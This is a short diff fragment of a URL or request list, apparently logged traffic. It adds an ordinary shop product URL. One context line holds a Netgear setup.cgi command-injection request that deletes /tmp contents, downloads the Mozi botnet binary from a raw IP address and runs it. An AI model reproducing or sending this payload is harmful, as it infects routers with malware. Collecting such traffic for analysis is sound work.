@@ -20361,3 +20361,4 @@ apiv4.9hits.com:443
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.210.101.211:52730/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /figs-loso-gold-figs-30-50-cm?order=DESC&sort=p.price&tag=50
 /figs-loso-gold-figs-30-50-cm?order=ASC&page=5&sort=pd.name&tag
+/figs-loso-gold-figs-30-50-cm?order=ASC&sort=pd.name&tag=50
